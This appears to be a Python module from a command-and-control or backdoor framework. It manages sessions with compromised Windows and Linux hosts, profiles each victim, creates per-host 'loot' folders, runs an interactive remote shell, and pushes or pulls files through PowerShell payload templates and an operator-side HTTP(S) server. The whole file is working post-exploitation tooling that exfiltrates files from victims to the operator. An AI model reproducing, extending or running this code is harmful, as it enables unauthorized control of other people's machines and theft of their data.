from .common import *
from .settings import HTTPFileServerSettings
from .session_manager import SessionManager
from .database import AgentsDB
from .logging import AutoComplete
from .payloads import powershell_download_file, powershell_upload_file, powershell_upload_file_ssl, powershell_download_file_ssl

from http.server import BaseHTTPRequestHandler
from base64 import b64decode
from tqdm import tqdm
import socket, os, re, time, threading



class Agent:
    
    def __init__(self, connection):
        
        self.path = None
        self.conn = connection
        self.shell_active = True
        self.buff = 4096


    def get_agent_info(self, agent_ip):
        try:

            self.send_command("(Get-WmiObject -Class Win32_OperatingSystem).Caption")
            response = self.receive_all()

            if "Windows" not in response:

                os_type = "Linux"

                self.send_command("hostname")
                response = self.receive_all().split('\n')

                hostname = response[0].strip('\r').upper()
                user = response[1].strip('\r')

            else:

                os_type = "Windows"

                self.send_command("whoami")
                response = self.receive_all()

                response = response.split('\n')[0].split('\\')
                hostname = response[0].upper()
                user = response[1].strip('\r')

            return user, hostname, os_type


        except ConnectionResetError:

            print(f"\n\n{ALERT} Failed to establish backdoor session with {YELLOW}{agent_ip}{RST}: Connection reset by peer")
            return

        except ConnectionError:

            print(f"\n\n{ALERT} Failed to establish backdoor session with {YELLOW}{agent_ip}{RST}: Connection error")
            return

        except Exception as e:

            print(f"\n\n{ALERT} Failed to establish backdoor session with {YELLOW}{agent_ip}{RST}: Unknown error occurred {e}")
            return



    def save_agent(self, agent_ip):

        agent_port = agent_ip[1]
        agent_ip = agent_ip[0]

        agents_db = AgentsDB()


        session_id = SessionManager.createSessionId()
        SessionManager.agents_connections[session_id] = self.conn

        try:
            user, hostname, os_type = self.get_agent_info(agent_ip)
        except:
            return

        user_and_hostname = f"{hostname}/{user}"

        print(f"\n\n{INFO} Connection with {GREEN}{agent_ip}:{agent_port}{RST} established")
        Main_Prompt.rst_prompt_menu()

        AutoComplete.defaultCommands.append(session_id)
        loot_path = f"Loots/{hostname}"

        try:

            if not os.path.exists(loot_path):
                os.makedirs(loot_path)

            SessionManager.loots_paths[session_id] = loot_path

        except OSError as e:

            print(f"{ERROR} An error occurred while trying to create loot directory: {e}")


        agents_db.add_agent(session_id, agent_ip, os_type, user_and_hostname, "Active")
        threading.Thread(target=self.is_agent_alive, daemon=True, name="is_agent_alive_thread").start()


    @staticmethod
    def is_agent_alive():

        agents_db = AgentsDB()

        while True:

            if not SessionManager.agents_connections:
                return

            time.sleep(1)

            for session_id, conn in SessionManager.agents_connections.items():
                try:
                    error = conn.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)

                    if error != 0:
                        agents_db.update_agent_status(session_id, "Inactive")
                        user = agents_db.get_agent_user(session_id)
                        print(f"\n\n{ALERT} Connection with Agent {RST}{ORANGE}{user}{RST} lost")
                        Main_Prompt.rst_prompt_menu()
                        pass

                except socket.timeout:
                    pass

                except ConnectionError:
                    agents_db.update_agent_status(session_id, "Inactive")


    def receive_all(self):

        data = b''

        try:

            while True:

                buff = self.conn.recv(self.buff)

                if not buff:
                    break
                data += buff

                if len(buff) < self.buff:
                    break

            return data.decode('utf-8')

        except socket.timeout:

            print(f"{ERROR} An error occurred while receiving data from agent: Connection timeout")
            self.close_shell()


        except ConnectionError:

            print(f"{ERROR} An error occurred while receiving data from agent: Connection error")
            self.close_shell()
            
        except Exception:

            print(f"{ERROR} An unknown error occurred while receiving data from agent")
            self.close_shell()


    def send_command(self, command):

        try:

            self.conn.send(command.encode('utf-8'))

        except ConnectionError:

            print(f"\n{ERROR} An error occurred while sending command: Connection error")
            self.close_shell()

        except socket.timeout:
            print(f"\n{ERROR} An error occurred while sending command: Connection timeout")
            self.close_shell()

        except Exception:

            print(f"\n{ERROR} Unknown error occurred while sending command")
            self.close_shell()

    def close_shell(self):
        
        self.conn = None
        self.shell_active = False
        print(f"\n{ALERT} Shell deactivated")


    @staticmethod
    def create_path(response):

        valid_path = re.search(r'([A-Za-z]:\\[^>\n]*>)', response)
        if valid_path:
            return valid_path.group(1)



    def init_path(self):
        
        self.send_command("pwd")
        response = self.receive_all()
        self.path = self.create_path(response)

        
    def remove_path(self, response):
        
        if self.path is not None:
            return response.replace(self.path, '').replace('>', '').strip()
        
        else:
            return response.replace('>', '').strip()
    
    @staticmethod
    def update_session_commands(command_executed, command_output):
        
        commands = command_executed.split()
        for command in commands:
            if command not in command_output:
                command_output.append(command)
    
        for command in command_output:
            if command not in AutoComplete.sessionsCommands:
                AutoComplete.sessionsCommands.append(command)
                                    
    @staticmethod
    def get_file_names(response):

        pattern = r'([-\w]+(?:\.\w+)?)(?=\s{2,})'
        matches = re.findall(pattern, response)
        
        file_names = sorted(set(match for match in matches if len(match) > 3 and not re.fullmatch(r'-+', match)), key=lambda x: response.index(x))
        
        return file_names


                
    def shell(self):

        print(f"\n{ADD} Interactive shell activated\n{INFO} Type 'exit' or press 'CTRL+C' to deactivate\n")
        self.init_path()

        while True:

            if self.shell_active:

                try:

                    command  = input(f"PS {self.path} ")
                    command_args = command.split()

                    if len(command_args) == 0:
                        continue

                    main_arg = command_args[0].strip().lower()

                    if main_arg == "exit":

                        self.close_shell()
                        break


                    elif len(main_arg) == 0:
                        continue

                    elif main_arg == "clear":
                        clear_screen()

                    elif main_arg == "upload":

                        args = command.split()

                        if len(args) < 3:

                            print(f"\n{ALERT} Missing <file path> <target path> arguments\n")
                            continue

                        else:

                            local_path = args[1].strip()
                            upload_path = args[2].strip()

                            self.upload_file(local_path, upload_path)


                    elif main_arg == "download":

                        args = command.split()

                        if len(args) < 2:
                            print(f"\n{ALERT} Missing <file path> argument\n")
                            continue

                        else:
                            file_path = args[1].strip()

                            self.downloadFile(file_path)

                    else:

                        self.send_command(command)
                        response = self.receive_all()

                        self.path = self.create_path(response)
                        response = self.remove_path(response)

                        file_names = self.get_file_names(response)

                        self.update_session_commands(command, file_names)

                        print(f"{GREEN}{response}{RST}")

                except KeyboardInterrupt:

                    print("\n")
                    self.close_shell()
                    break

            else:
                break


    def file_path_exists(self, file_path):

        check_file_path = f"Test-Path -Path {file_path}"

        self.send_command(check_file_path)
        is_path_exist = self.receive_all()
        is_path_exist = self.remove_path(is_path_exist)

        if is_path_exist == "True":

            return True

        else:
            return False


    def upload_file(self, local_path, upload_path):

        lhost = self.get_ip()
        protocol = "http"


        if HTTPFileServerSettings.SSL:

            protocol = "https"
            upload_payload = powershell_upload_file_ssl.Payload.template

        else:

            upload_payload = powershell_upload_file.Payload.template


        if os.path.exists(local_path):

            local_file_name = os.path.basename(local_path)

            if upload_path[-1] != "/" and upload_path[-1] != "\\":
                upload_path = upload_path + "\\"

            upload_file_name = os.path.basename(upload_path.replace("\\", "/"))

            if upload_file_name == "":
                upload_file_name = local_file_name

            upload_path = upload_path.replace(upload_file_name, '')

            if self.file_path_exists(upload_path):

                server_url = f"{protocol}://{lhost}:{HTTPFileServerSettings.bind_port}/{local_file_name}"

                upload_payload = upload_payload.replace("SERVERURL", server_url)
                upload_payload = upload_payload.replace("TARGETPATH", upload_path)

                FileHandler.filePath = local_path

                try:

                    self.send_command(upload_payload)
                    self.receive_all()
                    print(f"{ADD} File successfully uploaded\n")

                except ConnectionError:

                    print(f"\n{ERROR} Failed to upload file: Connection Error\n")

                except Exception:

                    print(f"\n{ERROR} Failed to upload file: Unknown error occurred\n")

            else:
                print(f'\n{ALERT} Upload path "{YELLOW}{upload_path}{RST}" not found\n')
                return

        else:
            print(f'\n{ALERT} File "{YELLOW}{local_path}{RST}" not found\n')
            return



    def get_ip(self):

        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        socket_obj.connect(("8.8.8.8", 80))
        return socket_obj.getsockname()[0]


    def downloadFile(self, file_path):

        lhost = self.get_ip()
        protocol = "http"

        check_file_path = f"Test-Path -Path {file_path}"

        if HTTPFileServerSettings.SSL:

            download_payload = powershell_download_file_ssl.Payload.template
            protocol = "https"

        else:
            download_payload = powershell_download_file.Payload.template


        self.send_command(check_file_path)
        is_file_exist = self.receive_all()
        is_file_exist = self.remove_path(is_file_exist)

        if is_file_exist == "True":

            if "/" not in file_path and "\\" not in file_path:
                file_path = self.path.replace(">", "") + "\\" + file_path

            file_name = os.path.basename(file_path.replace("\\", "/"))

            server_url = f"{protocol}://{lhost}:{HTTPFileServerSettings.bind_port}/{file_name}"
            download_payload = download_payload.replace("SERVERURL", server_url)
            download_payload = download_payload.replace("FILEPATH", file_path)

            try:

                self.send_command(download_payload)
                self.receive_all()

                print(f"{ADD} File successfully downloaded\n")

            except ConnectionError:

                print(f"\n{ERROR} Failed to download file: Connection Error\n")

            except Exception:

                print(f"\n{ERROR} Failed to download file: Unknown error occurred\n")


        else:
            print(f'\n{ALERT} File "{YELLOW}{file_path}{RST}" not found\n')


    

class FileHandler(BaseHTTPRequestHandler):
    
    filePath = "" 
    
    def do_GET(self):

        try:
            
            with open(self.filePath, 'rb') as file:
                
                file_size = os.path.getsize(self.filePath)
                file_name = os.path.basename(self.filePath)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/octet-stream')
                self.send_header('Content-Disposition', f'attachment; filename="{os.path.basename(self.filePath)}"')
                self.end_headers()
                
                print("")
                pr_bar = tqdm(total=file_size, unit='B', unit_scale=True, desc=f"{ADD} Uploading {GREEN}{file_name}{RST}", ascii=True, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} {postfix}", colour='green')
                
                for data in iter(lambda: file.read(1024), b''):
                    
                    self.wfile.write(data)
                    pr_bar.update(len(data))

                pr_bar.close()
                    
        except FileNotFoundError:

            print(f"\n{ALERT} File not found: {YELLOW}{self.filePath}{RST}")
            self.send_error(404, 'File Not Found: %s' % self.path)
            

    def do_POST(self):
                   
        file_name = os.path.basename(self.path)
        file_size = int(self.headers['Content-Length'])
                    
        print("")                   
        pr_bar = tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Downloading {GREEN}{file_name}{RST}", ascii=True, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} {postfix}", colour='green')

        with open(file_name, 'wb') as f:
            
            for byte in range(0, file_size, 1024):
                
                data = self.rfile.read(min(1024, file_size - byte))
                pr_bar.update(len(data))
                data = b64decode(data)
                f.write(data)
        
        pr_bar.close()
                    
        self.send_response(200)
        self.end_headers()
                 

    def log_message(self, format, *args):
        return

